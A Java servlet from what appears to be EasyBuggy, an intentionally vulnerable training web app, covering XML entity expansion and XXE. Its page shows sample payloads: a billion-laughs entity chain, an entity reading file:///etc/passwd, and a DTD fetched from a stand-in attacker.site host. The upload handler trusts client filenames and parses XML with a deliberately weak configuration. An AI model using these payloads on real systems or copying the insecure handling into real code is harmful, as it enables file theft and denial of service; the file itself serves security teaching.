package org.t246osslab.easybuggy.vulnerabilities;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Locale;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import javax.xml.XMLConstants;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.owasp.esapi.ESAPI;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.t246osslab.easybuggy.core.utils.Closer;
import org.t246osslab.easybuggy.core.utils.HTTPResponseCreator;
import org.t246osslab.easybuggy.core.utils.MessageUtils;
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

@SuppressWarnings("serial")
@WebServlet(urlPatterns = { "/xee", "/xxe" })
// 2MB, 10MB, 50MB
@MultipartConfig(fileSizeThreshold = 1024 * 1024 * 2, maxFileSize = 1024 * 1024 * 10, maxRequestSize = 1024 * 1024 * 50)
public class XEEandXXEServlet extends HttpServlet {

    private static final Logger log = LoggerFactory.getLogger(UnrestrictedSizeUploadServlet.class);

    // Name of the directory where uploaded files is saved
    private static final String SAVE_DIR = "uploadFiles";

    private static final String TAB = "&nbsp;&nbsp;&nbsp;&nbsp;";

    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {

        Locale locale = req.getLocale();

        StringBuilder bodyHtml = new StringBuilder();
        if ("/xee".equals(req.getServletPath())) {
            bodyHtml.append("<form method=\"post\" action=\"xee\" enctype=\"multipart/form-data\">");
        } else {
            bodyHtml.append("<form method=\"post\" action=\"xxe\" enctype=\"multipart/form-data\">");
        }
        bodyHtml.append(MessageUtils.getMsg("msg.add.users.by.xml", locale));
        bodyHtml.append("<br><br>");
        bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
        bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
        bodyHtml.append(ESAPI.encoder().encodeForHTML("<users ou=\"ou=people,dc=t246osslab,dc=org\" >") + "<br>");
        bodyHtml.append(TAB + ESAPI.encoder()
                .encodeForHTML("<user uid=\"user01\" phone=\"090-1234-5678\" mail=\"user01@example.com\"/>") + "<br>");
        bodyHtml.append(TAB + ESAPI.encoder()
                .encodeForHTML("<user uid=\"user02\" phone=\"090-9876-5432\" mail=\"user02@example.com\">") + "<br>");
        bodyHtml.append(ESAPI.encoder().encodeForHTML("</users>"));
        bodyHtml.append("</pre>");
        bodyHtml.append("<br>");
        bodyHtml.append("<input type=\"file\" name=\"file\" size=\"60\" /><br>");
        bodyHtml.append(MessageUtils.getMsg("msg.select.upload.file", locale));
        bodyHtml.append("<br><br>");
        bodyHtml.append("<input type=\"submit\" value=\"" + MessageUtils.getMsg("label.upload", locale) + "\" />");
        bodyHtml.append("<br><br>");
        if (req.getAttribute("errorMessage") != null) {
            bodyHtml.append(req.getAttribute("errorMessage"));
        }
        if ("/xee".equals(req.getServletPath())) {
            bodyHtml.append(MessageUtils.getInfoMsg("msg.note.xee", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!DOCTYPE s[") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x0 \"ha!\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x1 \"&x0;&x0;\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x2 \"&x1;&x1;\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x3 \"&x2;&x2;)\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!-- Entities from x4 to x98... -->") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x99 \"&x98;&x98;\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x100 \"&x99;&x99;\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("]>") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<soapenv:Envelope xmlns:soapenv=\"...\" xmlns:ns1=\"...\">")
                    + "<br>");
            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("<soapenv:Header>") + "<br>");
            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("</soapenv:Header>") + "<br>");
            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("<soapenv:Body>") + "<br>");
            bodyHtml.append(TAB + TAB + ESAPI.encoder().encodeForHTML("<ns1:reverse>") + "<br>");
            bodyHtml.append(TAB + TAB + TAB + ESAPI.encoder().encodeForHTML("<s>&x100;</s>") + "<br>");
            bodyHtml.append(TAB + TAB + ESAPI.encoder().encodeForHTML("</ns1:reverse>") + "<br>");
            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("</soapenv:Body>") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("</soapenv:Envelope>") + "<br>");
            bodyHtml.append("</pre>");
        } else {
            bodyHtml.append(MessageUtils.getInfoMsg("msg.note.xxe.step1", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">") + "<br>");
            bodyHtml.append(
                    ESAPI.encoder().encodeForHTML("<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">") + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("%p2;"));
            bodyHtml.append("</pre>");
            bodyHtml.append("<br>");
            bodyHtml.append(MessageUtils.getInfoMsg("msg.note.xxe.step2", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
            bodyHtml.append(
                    ESAPI.encoder().encodeForHTML("<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >")
                            + "<br>");
            bodyHtml.append(ESAPI.encoder().encodeForHTML("<users />"));
            bodyHtml.append("</pre>");
        }
        bodyHtml.append("</form>");
        HTTPResponseCreator.createSimpleResponse(req, res, MessageUtils.getMsg("title.xxe", locale), bodyHtml.toString());
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {

        Locale locale = req.getLocale();

        // Get absolute path of the web application
        String appPath = req.getServletContext().getRealPath("");

        // Create a directory to save the uploaded file if it does not exists
        String savePath = appPath + File.separator + SAVE_DIR;
        File fileSaveDir = new File(savePath);
        if (!fileSaveDir.exists()) {
            fileSaveDir.mkdir();
        }

        // Save the file
        OutputStream out = null;
        InputStream in = null;
        Part filePart = null;
        try {
            filePart = req.getPart("file");
        } catch (Exception e) {
            req.setAttribute("errorMessage", MessageUtils.getMsg("msg.max.file.size.exceed", locale));
            doGet(req, res);
            return;
        }
        try {
            String fileName = getFileName(filePart);
            if (fileName == null || "".equals(fileName)) {
                doGet(req, res);
                return;
            } else if (!fileName.endsWith(".xml")) {
                req.setAttribute("errorMessage", MessageUtils.getErrMsg("msg.not.xml.file", locale));
                doGet(req, res);
                return;
            }
            // TODO Remove this try block that is a workaround of issue #9 (FileNotFoundException on
            // Jetty * Windows)
            boolean isRegistered = false;
            try {
                out = new FileOutputStream(savePath + File.separator + fileName);
                in = filePart.getInputStream();
                int read = 0;
                final byte[] bytes = new byte[1024];
                while ((read = in.read(bytes)) != -1) {
                    out.write(bytes, 0, read);
                }
            } catch (FileNotFoundException e) {
                // Ignore because file already exists
                isRegistered = true;
            }

            SAXParser parser;
            CustomHandler customHandler = new CustomHandler();
            try {
                File file = new File(savePath + File.separator + fileName);
                SAXParserFactory spf = SAXParserFactory.newInstance();
                if ("/xee".equals(req.getServletPath())) {
                    spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
                    spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
                } else {
                    spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
                }
                parser = spf.newSAXParser();
                parser.parse(file, customHandler);

                // TODO Implement registration
                isRegistered = true;
            } catch (ParserConfigurationException e) {
                log.error("ParserConfigurationException occurs: ", e);
            } catch (SAXException e) {
                log.error("SAXException occurs: ", e);
            } catch (Exception e) {
                log.error("Exception occurs: ", e);
            }

            StringBuilder bodyHtml = new StringBuilder();
            if (isRegistered && customHandler.isRegistered()) {
                bodyHtml.append(MessageUtils.getMsg("msg.batch.registration.complete", locale));
                bodyHtml.append("<br><br>");
            } else {
                bodyHtml.append(MessageUtils.getErrMsg("msg.batch.registration.fail", locale));
            }
            bodyHtml.append(customHandler.getResult());
            bodyHtml.append("<br><br>");
            bodyHtml.append("<INPUT type=\"button\" onClick='history.back();' value=\""
                    + MessageUtils.getMsg("label.history.back", locale) + "\">");
            HTTPResponseCreator.createSimpleResponse(req, res, MessageUtils.getMsg("title.xxe", locale),
                    bodyHtml.toString());

        } catch (Exception e) {
            log.error("Exception occurs: ", e);
        } finally {
            Closer.close(out, in);
        }
    }

    // Get file name from content-disposition filename
    private String getFileName(final Part part) {
        for (String content : part.getHeader("content-disposition").split(";")) {
            if (content.trim().startsWith("filename")) {
                return content.substring(content.indexOf('=') + 1).trim().replace("\"", "");
            }
        }
        return null;
    }

    public class CustomHandler extends DefaultHandler {
        private StringBuilder result = new StringBuilder();
        private boolean isRegistered = false;
        private boolean isOuExist = false;

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes)
                throws SAXException {
            if ("users".equals(qName)) {
                String ou = attributes.getValue("ou");
                if (ou == null || "".equals(ou)) {
                    return;
                }
                isOuExist = true;
                result.append("<p>ou: " + ESAPI.encoder().encodeForHTML(ou) + "</p>");
                result.append("<hr/>");
                result.append("<div  class=\"container\">");
                result.append("<table class=\"table table-striped table-bordered table-hover\">");
                result.append("<tr>");
                result.append("<th>uid</th>");
                result.append("<th>phone</th>");
                result.append("<th>mail</th>");
                result.append("</tr>");
            } else if (isOuExist && "user".equals(qName)) {
                result.append("<tr>");
                result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("uid")) + "</td>");
                result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("phone")) + "</td>");
                result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("mail")) + "</td>");
                result.append("</tr>");
                isRegistered = true;
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) throws SAXException {
            if ("users".equals(qName)) {
                result.append("</table>");
                result.append("</div>");
            }
        }

        String getResult() {
            return result.toString();
        }

        boolean isRegistered() {
            return isRegistered;
        }
    }
}
